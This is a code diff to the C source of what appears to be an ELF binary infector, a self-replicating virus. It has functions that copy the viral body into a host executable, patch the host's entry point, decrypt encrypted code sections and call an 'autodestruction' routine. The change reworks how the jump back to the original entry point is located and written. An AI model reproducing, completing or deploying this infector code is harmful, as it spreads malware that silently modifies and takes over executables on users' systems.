@@ -25,12 +25,23 @@ __attribute__((always_inline)) static inline void replicate_on_memory(const stru
 
 __attribute__((always_inline)) static inline void patch_entry_point(const struct s_host *host, char *ptr)
 {
-	char jmp[] = {0xe9, 0x0, 0x0, 0x0, 0x0};
-	const Elf64_Addr entry_point = host->old_entry - host->new_entry - (host->note->self->p_filesz - 1286);
+	char *tmp = ptr + host->note->self->p_offset + ((void *)execution - (void *)__entry);
+
+	while (true)
+	{
+		if (*(unsigned char *)tmp == 0xe9)
+		{
+			tmp++;
+			break;
+		}
+		tmp++;
+	}
+
+	const int offset = (void *)(ptr + (host->note->self->p_offset + host->note->self->p_filesz)) - (void *)tmp;
+	const int entry_point = host->old_entry - host->new_entry - (host->note->self->p_filesz - (offset - JMP_SIZE));
 
 	_memcpy(ptr + host->note->self->p_offset, __entry, host->note->self->p_filesz);
-	_memcpy(jmp + 1, &entry_point, sizeof(int));
-	_memcpy(ptr + host->note->self->p_offset + (host->note->self->p_filesz - 1291), jmp, sizeof(jmp));
+	_memcpy(ptr + host->note->self->p_offset + (host->note->self->p_filesz - offset), &entry_point, sizeof(int));
 }
 
 ////////////////////////////////////////////////////////////////////////////////
@@ -39,7 +50,7 @@ __attribute__((always_inline)) static inline void patch_entry_point(const struct
 
 void injection(struct s_host *host, struct s_keychain *keychain, enum e_context context)
 {
-//	decrypt_right(keychain, (char *)header_infection, (void *)injection - (void *)header_infection);
+	//	decrypt_right(keychain, (char *)header_infection, (void *)injection - (void *)header_infection);
 
 #if DEBUG
 	MID_TRACER("injection:\t\t");
@@ -76,8 +87,8 @@ void injection(struct s_host *host, struct s_keychain *keychain, enum e_context 
 	_munmap(host->header, host->filesize);
 
 label:
-//	update_keychain_right(keychain, (char *)injection, (void *)autodestruction - (void *)injection);
-//	decrypt_right(keychain, (char *)autodestruction, (void *)__exit - (void *)autodestruction);
+	//	update_keychain_right(keychain, (char *)injection, (void *)autodestruction - (void *)injection);
+	//	decrypt_right(keychain, (char *)autodestruction, (void *)__exit - (void *)autodestruction);
 
 	autodestruction(host, keychain, context);
 }
